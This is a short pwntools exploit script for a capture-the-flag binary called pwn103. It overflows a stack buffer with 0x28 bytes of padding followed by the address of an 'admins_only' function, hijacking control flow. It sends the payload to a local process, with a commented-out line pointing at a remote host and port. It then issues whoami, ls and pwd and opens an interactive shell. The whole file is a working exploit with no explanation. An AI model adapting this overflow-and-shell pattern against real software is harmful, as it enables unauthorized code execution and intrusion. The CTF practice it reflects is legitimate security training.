from pwn import *

e = ELF('./pwn103-1644300337872.pwn103')
p = process('./pwn103-1644300337872.pwn103')
# r = remote('10.201.26.151', 9003)

payload = b'A' * 0x28 + p64(e.sym['admins_only'])

p.recvuntil(b':')
p.sendline(b'3')
p.sendlineafter(b'[pwner]:', payload)
p.recv()
# p.interactive()
p.sendline('whoami')
p.sendline('ls')
p.sendline('pwd')
p.interactive()